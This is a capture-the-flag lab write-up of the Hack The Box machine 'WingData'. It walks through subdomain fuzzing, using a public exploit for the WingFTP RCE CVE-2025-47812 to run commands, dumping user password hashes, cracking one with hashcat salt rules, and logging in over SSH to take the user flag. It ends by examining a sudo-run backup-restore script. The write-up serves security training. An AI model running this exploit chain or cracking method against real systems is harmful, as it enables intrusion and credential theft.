---
title: "WingData Writeup"
permalink: /season_10/wingdata.html
box:
  machine_name: "WingData"
  release: "14 Feb 2026"
  retire: "27 Jun 2026"
  os: "Linux"
  base_points: "Easy [20]"
  first_blood_user: "00:07:18 — Opcode (Elite Hacker)"
  first_blood_root: "00:20:01 — Arsen44 (Pro Hacker)"
  creator: "WackyH4cker (Pro Hacker)"
  machine_url: "https://www.hackthebox.com/machines/wingdata"
---

I started with an nmap scan to check for open ports
```
┌──(kali㉿kali)-[~/Boxes/season_10/wingdata]
└─$ nmap -sC -sV 10.129.224.70 -p- -T5
Starting Nmap 7.95 ( https://nmap.org ) at 2026-02-14 14:20 EST
Nmap scan report for 10.129.224.70
Host is up (0.22s latency).
Not shown: 65533 filtered tcp ports (no-response)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 9.2p1 Debian 2+deb12u7 (protocol 2.0)
| ssh-hostkey: 
|   256 a1:fa:95:8b:d7:56:03:85:e4:45:c9:c7:1e:ba:28:3b (ECDSA)
|_  256 9c:ba:21:1a:97:2f:3a:64:73:c1:4c:1d:ce:65:7a:2f (ED25519)
80/tcp open  http    Apache httpd 2.4.66
|_http-title: Did not follow redirect to http://wingdata.htb/
|_http-server-header: Apache/2.4.66 (Debian)
Service Info: Host: localhost; OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 248.02 seconds
```
Navigating to the web leads us to a website offering a service to send and share files up to 100 GB with AES-256 encryption. There is a contact form at the bottom but interacting with this and using feroxbuster to brute force directories, we get nothing so I move on.
<img width="996" height="3423" alt="image" src="https://github.com/user-attachments/assets/9bd9ec88-8189-450a-ac83-298ca44cb8d9" />

Using ffuf I fuzzed for subdomains and found that there is one named `ftp`.
```
┌──(kali㉿kali)-[~/Boxes/season_10/wingdata]
└─$ ffuf -u http://10.129.224 -H "Host: FUZZ.wingdata.htb" -w /opt/SecLists/Discovery/DNS/subdomains-top1million-20000.txt -ac

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://10.129.244.106
 :: Wordlist         : FUZZ: /opt/SecLists/Discovery/DNS/subdomains-top1million-20000.txt
 :: Header           : Host: FUZZ.wingdata.htb
 :: Follow redirects : false
 :: Calibration      : true
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
________________________________________________

ftp                     [Status: 200, Size: 678, Words: 44, Lines: 10, Duration: 52ms]
:: Progress: [19966/19966] :: Job [1/1] :: 2061 req/sec :: Duration: [0:00:10] :: Errors: 0 ::
```
Going to this website displays the WingFTP web client. The bottom shows that this service is running version `7.4.3`
<img width="448" height="539" alt="image" src="https://github.com/user-attachments/assets/81bdcb27-4dab-4794-ba9c-b13a66e93dd1" />

This version of WingFTP is susceptible to CVE-2025-47812 (CVSS 9.8 / 10.0), which is an unauthenticated RCE vulnerability. The PoC can be found [here](https://www.exploit-db.com/exploits/52347)

Using this PoC I was able to achieve RCE as the wingftp instance
```
┌──(kali㉿kali)-[~/Boxes/season_10/wingdata]
└─$ python3 wingftp.py -u http://ftp.wingdata.htb/ -c "whoami"

[*] Testing target: http://ftp.wingdata.htb/
[+] Sending POST request to http://ftp.wingdata.htb//loginok.html with command: 'whoami' and username: 'anonymous'
[+] UID extracted: 79f43a352c11e5378ef5e72fc89468b2f528764d624db129b32c21fbca0cb8d6
[+] Sending GET request to http://ftp.wingdata.htb//dir.html with UID: 79f43a352c11e5378ef5e72fc89468b2f528764d624db129b32c21fbca0cb8d6

--- Command Output ---                                                                                                                                         
wingftp
----------------------
```

Looking through the `Data` directories, there exists a user directory with xml files containing the users of the WingFTP instance.
```
┌──(kali㉿kali)-[~/Boxes/season_10/wingdata]
└─$ python3 wingftp.py -u http://ftp.wingdata.htb/ -c "ls -la  Data/1/users" 

[*] Testing target: http://ftp.wingdata.htb/
[+] Sending POST request to http://ftp.wingdata.htb//loginok.html with command: 'ls -la  Data/1/users' and username: 'anonymous'
[+] UID extracted: d575e7b04f0fd6bb9ad605c825053907f528764d624db129b32c21fbca0cb8d6
[+] Sending GET request to http://ftp.wingdata.htb//dir.html with UID: d575e7b04f0fd6bb9ad605c825053907f528764d624db129b32c21fbca0cb8d6

--- Command Output ---
total 28
drwxr-x--- 2 wingftp wingftp 4096 Feb 14 17:48 .
drwxr-x--- 4 wingftp wingftp 4096 Feb  9 08:19 ..
-rwxr-x--- 1 wingftp wingftp 2842 Feb 14 17:48 anonymous.xml
-rwxr-x--- 1 wingftp wingftp 2846 Nov  2 11:13 john.xml
-rw-rw-rw- 1 wingftp wingftp 2847 Nov  2 12:05 maria.xml
-rw-rw-rw- 1 wingftp wingftp 2847 Nov  2 12:02 steve.xml
-rw-rw-rw- 1 wingftp wingftp 2856 Nov  2 12:28 wacky.xml
```

Looking through the xml files we see the hashes of the users. The list of hashes for each user is below.
```
admins:a8339f8e4465a9c47158394d8efe7cc45a5f361ab983844c8562bef2193bafba
maria:a70221f33a51dca76dfd46c17ab17116a97823caf40aeecfbc611cae47421b03
steve:5916c7481fa2f20bd86f4bdb900f0342359ec19a77b7e3ae118f3b5d0d3334ca
wacky:32940defd3c3ef70a2dd44a5301ff984c4742f0baae76ff5b8783994f8a503ca
anonymous:d67f86152e5c4df1b0ac4a18d3ca4a89c1b12e6b748ed71d01aeb92341927bca
john:c1f14672feec3bba27231048271fcdcddeb9d75ef79f6889139aa78c9d398f10
```

I put these hashes in `hashcat` but I didn't get any hits, so I dug further into the machine.

Looking through the contents of WingFTP I found a 
```
<?xml version="1.0" ?>
<DOMAIN_OPTION Description="Wing FTP Server Domain settings">
    <Domain_Max_Session>0</Domain_Max_Session>
    <Domain_Per_Ip_Max_Session>0</Domain_Per_Ip_Max_Session>
    <Per_Session_Max_Download_Speed>0</Per_Session_Max_Download_Speed>
    <Per_Session_Max_Upload_Speed>0</Per_Session_Max_Upload_Speed>
    <Domain_Max_Download_Speed>0</Domain_Max_Download_Speed>
    <Domain_Max_Upload_Speed>0</Domain_Max_Upload_Speed>
    <Per_User_Max_Download_Speed>0</Per_User_Max_Download_Speed>
    <Per_User_Max_Upload_Speed>0</Per_User_Max_Upload_Speed>
    <Passive_Type>0</Passive_Type>
    <Pasv_Ip_Refresh_Interval>60</Pasv_Ip_Refresh_Interval>
    <Fixed_Ip></Fixed_Ip>
    <Web_Ip>http://ip.wftpserver.com/w/getIP.php</Web_Ip>
    <DNS_Ip></DNS_Ip>
    <Enable_UPnP_For_Passive_Ports>0</Enable_UPnP_For_Passive_Ports>
    <Min_Passive_Port>1024</Min_Passive_Port>
    <Max_Passive_Port>1124</Max_Passive_Port>
    <Transfer_Buffer_Size>65535</Transfer_Buffer_Size>
    <Userdata_Access_Style>1</Userdata_Access_Style>
    <MYSQL_Address>localhost</MYSQL_Address>
    <MYSQL_Port>3306</MYSQL_Port>
    <MYSQL_Username>root</MYSQL_Username>
    <MYSQL_Password></MYSQL_Password>
    <MYSQL_DatabaseName>wftp_database</MYSQL_DatabaseName>
    <MYSQL_UnixSocket></MYSQL_UnixSocket>
    <ODBC_DSN_Address></ODBC_DSN_Address>
    <ODBC_DSN_Username></ODBC_DSN_Username>
    <ODBC_DSN_Password></ODBC_DSN_Password>
    <Enable_Mode_Z_support>0</Enable_Mode_Z_support>
    <Default_Compression_level>8</Default_Compression_level>
    <Min_Compression_level>1</Min_Compression_level>
    <Max_Compression_level>9</Max_Compression_level>
    <Enable_SFV_Check>0</Enable_SFV_Check>
    <SFV_Check_Create_Missing>0</SFV_Check_Create_Missing>
    <SFV_Check_Bad_File>0</SFV_Check_Bad_File>
    <SFV_Check_Create_Progress>0</SFV_Check_Create_Progress>
    <SFV_Check_Send_Result>0</SFV_Check_Send_Result>
    <Anti_Hammer_Enable>1</Anti_Hammer_Enable>
    <Anti_Hammer_Block_Time>180</Anti_Hammer_Block_Time>
    <Anti_Hammer_Login_Failed_Counts>10</Anti_Hammer_Login_Failed_Counts>
    <Anti_Hammer_Interval>90</Anti_Hammer_Interval>
    <Anti_Hammer_Send_Message>0</Anti_Hammer_Send_Message>
    <SSL_Name>wftp_default_ssl</SSL_Name>
    <SSH_Name>wftp_default_ssh</SSH_Name>
    <SSH_Use_UTF8>1</SSH_Use_UTF8>
    <SMTP_Name></SMTP_Name>
    <Enable_FXP>0</Enable_FXP>
    <Enable_WebLink>0</Enable_WebLink>
    <Enable_Logfile>1</Enable_Logfile>
    <Logfile_Name>%Y-%M-%D.log</Logfile_Name>
    <Logfile_Maxsize>512000</Logfile_Maxsize>
    <Message_Log_File_Enable>1</Message_Log_File_Enable>
    <Message_Log_Scrn_Enable>1</Message_Log_Scrn_Enable>
    <Security_Log_File_Enable>1</Security_Log_File_Enable>
    <Security_Log_Scrn_Enable>1</Security_Log_Scrn_Enable>
    <FTP_Command_Log_File_Enable>1</FTP_Command_Log_File_Enable>
    <FTP_Command_Log_Scrn_Enable>1</FTP_Command_Log_Scrn_Enable>
    <FTP_Response_Log_File_Enable>1</FTP_Response_Log_File_Enable>
    <FTP_Response_Log_Scrn_Enable>1</FTP_Response_Log_Scrn_Enable>
    <WEB_Command_Log_File_Enable>1</WEB_Command_Log_File_Enable>
    <WEB_Command_Log_Scrn_Enable>1</WEB_Command_Log_Scrn_Enable>
    <WEB_Response_Log_File_Enable>1</WEB_Response_Log_File_Enable>
    <WEB_Response_Log_Scrn_Enable>1</WEB_Response_Log_Scrn_Enable>
    <SSH_Command_Log_File_Enable>1</SSH_Command_Log_File_Enable>
    <SSH_Command_Log_Scrn_Enable>1</SSH_Command_Log_Scrn_Enable>
    <SSH_Response_Log_File_Enable>1</SSH_Response_Log_File_Enable>
    <SSH_Response_Log_Scrn_Enable>1</SSH_Response_Log_Scrn_Enable>
    <ODBC_Error_Log_File_Enable>1</ODBC_Error_Log_File_Enable>
    <ODBC_Error_Log_Scrn_Enable>1</ODBC_Error_Log_Scrn_Enable>
    <MYSQL_Error_Log_File_Enable>1</MYSQL_Error_Log_File_Enable>
    <MYSQL_Error_Log_Scrn_Enable>1</MYSQL_Error_Log_Scrn_Enable>
    <LUA_Error_Log_File_Enable>1</LUA_Error_Log_File_Enable>
    <LUA_Error_Log_Scrn_Enable>1</LUA_Error_Log_Scrn_Enable>
    <Mail_Error_Log_File_Enable>1</Mail_Error_Log_File_Enable>
    <Mail_Error_Log_Scrn_Enable>1</Mail_Error_Log_Scrn_Enable>
    <File_Error_Log_File_Enable>1</File_Error_Log_File_Enable>
    <File_Error_Log_Scrn_Enable>1</File_Error_Log_Scrn_Enable>
    <Normal_Error_Log_File_Enable>1</Normal_Error_Log_File_Enable>
    <Normal_Error_Log_Scrn_Enable>1</Normal_Error_Log_Scrn_Enable>
    <Message_Welcome>%ServerName ready...</Message_Welcome>
    <Message_Login>User %Name logged in.</Message_Login>
    <Message_Change_Dir>CWD command ok. &quot;%Dir&quot; is current directory.</Message_Change_Dir>
    <Message_Dir_List>Transfer ok.</Message_Dir_List>
    <Message_File_Upload>File received ok. Transferred:%ConTransferBytes;Average speed is:%ConTransferSpeedKBS</Message_File_Upload>
    <Message_File_Download>File sent ok. Transferred:%ConTransferBytes;Average speed is:%ConTransferSpeedKBS</Message_File_Download>
    <Message_System_Command>UNIX Type: L8</Message_System_Command>
    <Message_Quit_Command>Goodbye.</Message_Quit_Command>
    <Enable_UPnP_For_Listener_Ports>0</Enable_UPnP_For_Listener_Ports>
    <Max_Number_Sessions_Per_User_Account>0</Max_Number_Sessions_Per_User_Account>
    <Max_Sessions_Per_Ip_For_User_Account>0</Max_Sessions_Per_Ip_For_User_Account>
    <Command_Timeout_Min>5</Command_Timeout_Min>
    <Enable_Domain_Logo>0</Enable_Domain_Logo>
    <Transfer_Timeout_Minutes>5</Transfer_Timeout_Minutes>
    <ADUser_Enable>0</ADUser_Enable>
    <ADUser_Domain></ADUser_Domain>
    <ADUser_Directory></ADUser_Directory>
    <ADUser_Enable_OwnDir>0</ADUser_Enable_OwnDir>
    <ADUser_Enable_FileRead>1</ADUser_Enable_FileRead>
    <ADUser_Enable_FileWrite>0</ADUser_Enable_FileWrite>
    <ADUser_Enable_FileAppend>0</ADUser_Enable_FileAppend>
    <ADUser_Enable_FileDelete>0</ADUser_Enable_FileDelete>
    <ADUser_Enable_DirRename>0</ADUser_Enable_DirRename>
    <ADUser_Enable_DirList>1</ADUser_Enable_DirList>
    <ADUser_Enable_DirCreate>0</ADUser_Enable_DirCreate>
    <ADUser_Enable_DirDelete>0</ADUser_Enable_DirDelete>
    <ADUser_Enable_FileRename>0</ADUser_Enable_FileRename>
    <ADUser_Enable_ZipFile>0</ADUser_Enable_ZipFile>
    <ADUser_Enable_UnzipFile>0</ADUser_Enable_UnzipFile>
    <ADUser_User_Mapping>ADUser001:LocalUser001&#x0A;ADUser002:LocalUser002</ADUser_User_Mapping>
    <LDAP_Enable>0</LDAP_Enable>
    <LDAP_Host>localhost</LDAP_Host>
    <LDAP_Port>389</LDAP_Port>
    <LDAP_UseSSL>0</LDAP_UseSSL>
    <LDAP_BindDN></LDAP_BindDN>
    <LDAP_BindPass></LDAP_BindPass>
    <LDAP_BaseDN></LDAP_BaseDN>
    <LDAP_Filter>(&amp;(objectClass=posixAccount)(uid=%s))</LDAP_Filter>
    <LDAP_Directory></LDAP_Directory>
    <LDAP_Enable_OwnDir>0</LDAP_Enable_OwnDir>
    <LDAP_Enable_FileRead>1</LDAP_Enable_FileRead>
    <LDAP_Enable_FileWrite>0</LDAP_Enable_FileWrite>
    <LDAP_Enable_FileAppend>0</LDAP_Enable_FileAppend>
    <LDAP_Enable_FileDelete>0</LDAP_Enable_FileDelete>
    <LDAP_Enable_DirRename>0</LDAP_Enable_DirRename>
    <LDAP_Enable_DirList>1</LDAP_Enable_DirList>
    <LDAP_Enable_DirCreate>0</LDAP_Enable_DirCreate>
    <LDAP_Enable_DirDelete>0</LDAP_Enable_DirDelete>
    <LDAP_Enable_FileRename>0</LDAP_Enable_FileRename>
    <LDAP_Enable_ZipFile>0</LDAP_Enable_ZipFile>
    <LDAP_Enable_UnzipFile>0</LDAP_Enable_UnzipFile>
    <LDAP_User_Mapping>LDAPUser001:LocalUser001&#x0A;LDAPUser002:LocalUser002</LDAP_User_Mapping>
    <LDAP_Group_Mapping>CN=ADGroup1,CN=Builtin,DC=wftpserver,DC=com:LocalUser1&#x0A;CN=ADGroup2,CN=Builtin,DC=wftpserver,DC=com:LocalUser2</LDAP_Group_Mapping>
    <LDAP_Version>3</LDAP_Version>
    <LDAP_Dir_Lowercase>0</LDAP_Dir_Lowercase>
    <WebLink_Speed>0</WebLink_Speed>
    <LIST_TIME_GMT>1</LIST_TIME_GMT>
    <Logfile_Compress>1</Logfile_Compress>
    <Enable_UTF8_ON>1</Enable_UTF8_ON>
    <Enable_AUTH_ON>1</Enable_AUTH_ON>
    <Use_LANIP_For_LAN_Client_Passive>1</Use_LANIP_For_LAN_Client_Passive>
    <Min_Password_Length>0</Min_Password_Length>
    <Password_Have_Numerals>0</Password_Have_Numerals>
    <Password_Have_Lowercase>0</Password_Have_Lowercase>
    <Password_Have_Uppercase>0</Password_Have_Uppercase>
    <Password_Have_Nonalphanumeric>0</Password_Have_Nonalphanumeric>
    <Enable_NTFS_Permission>0</Enable_NTFS_Permission>
    <EnableSHA256>1</EnableSHA256>
    <Enable_HTTPS_Redirect>0</Enable_HTTPS_Redirect>
    <HTTPS_Redirect_Port>443</HTTPS_Redirect_Port>
    <Change_Password_Firstlogon>0</Change_Password_Firstlogon>
    <Enable_UploadLink>0</Enable_UploadLink>
    <UploadLink_Speed>0</UploadLink_Speed>
    <Additional_HTTP_Headers></Additional_HTTP_Headers>
    <Allow_Passive_Active_Mode>2</Allow_Passive_Active_Mode>
    <Passive_Listener_Timeout>30</Passive_Listener_Timeout>
    <Auto_Passive_Port_Forward>0</Auto_Passive_Port_Forward>
    <MYSQL_Set_UTF8>1</MYSQL_Set_UTF8>
    <Enable_Domain>1</Enable_Domain>
    <Auto_Active_Port_Forward>0</Auto_Active_Port_Forward>
    <Weblink_URL></Weblink_URL>
    <Enable_Symbolic_Link>0</Enable_Symbolic_Link>
    <Enable_Welcome_Message>0</Enable_Welcome_Message>
    <Welcome_Message></Welcome_Message>
    <Keep_Old_Weblink>0</Keep_Old_Weblink>
    <Uplink_Overwrite_File>0</Uplink_Overwrite_File>
    <SSH_Banner>WingFTPServer</SSH_Banner>
    <HTTP_KeepAlive>1</HTTP_KeepAlive>
    <Enable_Weblink_Subfolder>0</Enable_Weblink_Subfolder>
    <TLS_Session_Timeout>3600</TLS_Session_Timeout>
    <EnablePasswordSalting>1</EnablePasswordSalting>
    <SaltingString>WingFTP</SaltingString>
    <Enable_Log_Millisecond>0</Enable_Log_Millisecond>
    <LDAP_Mapping_CaseInsensitive>0</LDAP_Mapping_CaseInsensitive>
    <LDAP_Timeout>10</LDAP_Timeout>
    <Keep_Anonymous_Weblink>0</Keep_Anonymous_Weblink>
    <Transfer_Limit>
        <Transfer_Limit_Enable>0</Transfer_Limit_Enable>
        <Transfer_Limit_Reset>0</Transfer_Limit_Reset>
        <Transfer_Limit_Reset_Time>0</Transfer_Limit_Reset_Time>
        <Enable_Upload_Limit_Never>0</Enable_Upload_Limit_Never>
        <Current_Upload_Size_Never>0</Current_Upload_Size_Never>
        <Max_Upload_Size_Never>0</Max_Upload_Size_Never>
        <Enable_Download_Limit_Never>0</Enable_Download_Limit_Never>
        <Current_Download_Size_Never>0</Current_Download_Size_Never>
        <Max_Download_Size_Never>0</Max_Download_Size_Never>
        <Enable_Upload_Limit_Hourly>0</Enable_Upload_Limit_Hourly>
        <Current_Upload_Size_Hourly>0</Current_Upload_Size_Hourly>
        <Max_Upload_Size_Hourly>0</Max_Upload_Size_Hourly>
        <Enable_Download_Limit_Hourly>0</Enable_Download_Limit_Hourly>
        <Current_Download_Size_Hourly>0</Current_Download_Size_Hourly>
        <Max_Download_Size_Hourly>0</Max_Download_Size_Hourly>
        <Enable_Upload_Limit_Daily>0</Enable_Upload_Limit_Daily>
        <Current_Upload_Size_Daily>0</Current_Upload_Size_Daily>
        <Max_Upload_Size_Daily>0</Max_Upload_Size_Daily>
        <Enable_Download_Limit_Daily>0</Enable_Download_Limit_Daily>
        <Current_Download_Size_Daily>0</Current_Download_Size_Daily>
        <Max_Download_Size_Daily>0</Max_Download_Size_Daily>
        <Enable_Upload_Limit_Weekly>0</Enable_Upload_Limit_Weekly>
        <Current_Upload_Size_Weekly>0</Current_Upload_Size_Weekly>
        <Max_Upload_Size_Weekly>0</Max_Upload_Size_Weekly>
        <Enable_Download_Limit_Weekly>0</Enable_Download_Limit_Weekly>
        <Current_Download_Size_Weekly>0</Current_Download_Size_Weekly>
        <Max_Download_Size_Weekly>0</Max_Download_Size_Weekly>
        <Enable_Upload_Limit_Monthly>0</Enable_Upload_Limit_Monthly>
        <Current_Upload_Size_Monthly>0</Current_Upload_Size_Monthly>
        <Max_Upload_Size_Monthly>0</Max_Upload_Size_Monthly>
        <Enable_Download_Limit_Monthly>0</Enable_Download_Limit_Monthly>
        <Current_Download_Size_Monthly>0</Current_Download_Size_Monthly>
        <Max_Download_Size_Monthly>0</Max_Download_Size_Monthly>
    </Transfer_Limit>
</DOMAIN_OPTION>
```

We see in the configuration above, there is a SaltingString value
<img width="1131" height="338" alt="image" src="https://github.com/user-attachments/assets/9bf564b0-c385-4e16-9097-b2322703a59d" />

For the next hashcat I created both a prepend and append salt rule with the same string 
```
┌──(kali㉿kali)-[~/Boxes/season_10/wingdata]
└─$ echo '^W$i$n$g$F$T$P' > prepend_salt.rule
                                                                                                                                                                                                       
┌──(kali㉿kali)-[~/Boxes/season_10/wingdata]
└─$ echo '$W$i$n$g$F$T$P' > append_salt.rule
```

Using `hashcat` with the salt rule I was able to get a hit for the user `wacky`
```
┌──(kali㉿kali)-[~/Boxes/season_10/wingdata]
└─$ hashcat -a 0 -m 1400 wacky.hash /usr/share/wordlists/rockyou.txt -r append_salt.rule 
hashcat (v7.1.2) starting

OpenCL API (OpenCL 3.0 PoCL 6.0+debian  Linux, None+Asserts, RELOC, SPIR-V, LLVM 18.1.8, SLEEF, DISTRO, POCL_DEBUG) - Platform #1 [The pocl project]
====================================================================================================================================================
* Device #01: cpu-haswell-13th Gen Intel(R) Core(TM) i9-13900H, 2930/5861 MB (1024 MB allocatable), 8MCU

Minimum password length supported by kernel: 0
Maximum password length supported by kernel: 256

Hashes: 1 digests; 1 unique digests, 1 unique salts
Bitmaps: 16 bits, 65536 entries, 0x0000ffff mask, 262144 bytes, 5/13 rotates
Rules: 1

Optimizers applied:
* Zero-Byte
* Early-Skip
* Not-Salted
* Not-Iterated
* Single-Hash
* Single-Salt
* Raw-Hash

ATTENTION! Pure (unoptimized) backend kernels selected.
Pure kernels can crack longer passwords, but drastically reduce performance.
If you want to switch to optimized kernels, append -O to your commandline.
See the above message to find out about the exact limits.

Watchdog: Temperature abort trigger set to 90c

Host memory allocated for this attack: 514 MB (6381 MB free)

Dictionary cache hit:
* Filename..: /usr/share/wordlists/rockyou.txt
* Passwords.: 14344385
* Bytes.....: 139921507
* Keyspace..: 14344385

32940defd3c3ef70a2dd44a5301ff984c4742f0baae76ff5b8783994f8a503ca:!#7Blushing^*Bride5WingFTP
                                                          
Session..........: hashcat
Status...........: Cracked
Hash.Mode........: 1400 (SHA2-256)
Hash.Target......: 32940defd3c3ef70a2dd44a5301ff984c4742f0baae76ff5b87...a503ca
Time.Started.....: Sat Feb 14 18:08:09 2026 (10 secs)
Time.Estimated...: Sat Feb 14 18:08:19 2026 (0 secs)
Kernel.Feature...: Pure Kernel (password length 0-256 bytes)
Guess.Base.......: File (/usr/share/wordlists/rockyou.txt)
Guess.Mod........: Rules (append_salt.rule)
Guess.Queue......: 1/1 (100.00%)
Speed.#01........:  1447.6 kH/s (1.41ms) @ Accel:1024 Loops:1 Thr:1 Vec:8
Recovered........: 1/1 (100.00%) Digests (total), 1/1 (100.00%) Digests (new)
Progress.........: 14344192/14344385 (100.00%)
Rejected.........: 0/14344192 (0.00%)
Restore.Point....: 14336000/14344385 (99.94%)
Restore.Sub.#01..: Salt:0 Amplifier:0-1 Iteration:0-1
Candidate.Engine.: Device Generator
Candidates.#01...: #!hottieWingFTP ->  ladykitzWingFTP
Hardware.Mon.#01.: Util: 36%

Started: Sat Feb 14 18:08:07 2026
Stopped: Sat Feb 14 18:08:20 2026
```

Using the user/pass combination I was able to log into ssh and retrieve the user flag
```
┌──(kali㉿kali)-[~/Boxes/season_10/wingdata]
└─$ ssh wacky@10.129.224.96                     
wacky@10.129.224.96's password: 
Permission denied, please try again.
wacky@10.129.224.96's password: 
Permission denied, please try again.
wacky@10.129.224.96's password: 
Linux wingdata 6.1.0-42-amd64 #1 SMP PREEMPT_DYNAMIC Debian 6.1.159-1 (2025-12-30) x86_64

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
Last login: Sat Feb 14 18:16:20 2026 from 10.10.14.91
wacky@wingdata:~$ cat user.txt
b142b709e***********
```

Checking sudo permissions showed that the `wacky` user can run a `restore_backup_clients.py` script within the `backup_clients` directory.
```
wacky@wingdata:~$ sudo -l
Matching Defaults entries for wacky on wingdata:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin, use_pty

User wacky may run the following commands on wingdata:
    (root) NOPASSWD: /usr/local/bin/python3 /opt/backup_clients/restore_backup_clients.py *
```

Running python as sudo for this script shows options for restoring backups.
```
wacky@wingdata:/opt/backup_clients$ sudo /usr/local/bin/python3 /opt/backup_clients/restore_backup_clients.py -h
usage: restore_backup_clients.py [-h] -b BACKUP -r RESTORE_DIR

Restore client configuration from a validated backup tarball.

options:
  -h, --help            show this help message and exit
  -b BACKUP, --backup BACKUP
                        Backup filename (must be in /home/wacky/backup_clients/ and match backup_<client_id>.tar, where <client_id> is a positive integer,
                        e.g., backup_1001.tar)
  -r RESTORE_DIR, --restore-dir RESTORE_DIR
                        Staging directory name for the restore operation. Must follow the format: restore_<client_user> (e.g., restore_john). Only
                        alphanumeric characters and underscores are allowed in the <client_user> part (1–24 characters).

Example: sudo restore_backup_clients.py -b backup_1001.tar -r restore_john
```
Looking at the source code for this script, it takes a .tar file as input. The file has to be named something like `backup_<any_digits>.tar` and parses it. However, looking through the code doesn't show anything interesting so I moved on.
###### Source Code
```
#!/usr/bin/env python3
import tarfile
import os
import sys
import re
import argparse

BACKUP_BASE_DIR = "/opt/backup_clients/backups"
STAGING_BASE = "/opt/backup_clients/restored_backups"

def validate_backup_name(filename):
    if not re.fullmatch(r"^backup_\d+\.tar$", filename):
        return False
    client_id = filename.split('_')[1].rstrip('.tar')
    return client_id.isdigit() and client_id != "0"

def validate_restore_tag(tag):
    return bool(re.fullmatch(r"^[a-zA-Z0-9_]{1,24}$", tag))

def main():
    ...[snip]...

if __name__ == "__main__":
    main()

def main():
    parser = argparse.ArgumentParser(
        description="Restore client configuration from a validated backup tarball.",
        epilog="Example: sudo %(prog)s -b backup_1001.tar -r restore_john"
    )
    parser.add_argument(
        "-b", "--backup",
        required=True,
        help="Backup filename (must be in /home/wacky/backup_clients/ and match backup_<client_id>.tar, "
             "where <client_id> is a positive integer, e.g., backup_1001.tar)"
    )
    parser.add_argument(
        "-r", "--restore-dir",
        required=True,
        help="Staging directory name for the restore operation. "
             "Must follow the format: restore_<client_user> (e.g., restore_john). "
             "Only alphanumeric characters and underscores are allowed in the <client_user> part (1–24 characters)."
    )

    args = parser.parse_args()

    if not validate_backup_name(args.backup):
        print("[!] Invalid backup name. Expected format: backup_<client_id>.tar (e.g., backup_1001.tar)", file=sys.stderr)
        sys.exit(1)

    backup_path = os.path.join(BACKUP_BASE_DIR, args.backup)
    if not os.path.isfile(backup_path):
        print(f"[!] Backup file not found: {backup_path}", file=sys.stderr)
        sys.exit(1)

    if not args.restore_dir.startswith("restore_"):
        print("[!] --restore-dir must start with 'restore_'", file=sys.stderr)
        sys.exit(1)

    tag = args.restore_dir[8:]
    if not tag:
        print("[!] --restore-dir must include a non-empty tag after 'restore_'", file=sys.stderr)
        sys.exit(1)

    if not validate_restore_tag(tag):
        print("[!] Restore tag must be 1–24 characters long and contain only letters, digits, or underscores", file=sys.stderr)
        sys.exit(1)
    staging_dir = os.path.join(STAGING_BASE, args.restore_dir)
    print(f"[+] Backup: {args.backup}")
    print(f"[+] Staging directory: {staging_dir}")

    os.makedirs(staging_dir, exist_ok=True)

    try:
        with tarfile.open(backup_path, "r") as tar:
            tar.extractall(path=staging_dir, filter="data")
        print(f"[+] Extraction completed in {staging_dir}")
    except (tarfile.TarError, OSError, Exception) as e:
        print(f"[!] Error during extraction: {e}", file=sys.stderr)
        sys.exit(2)
```


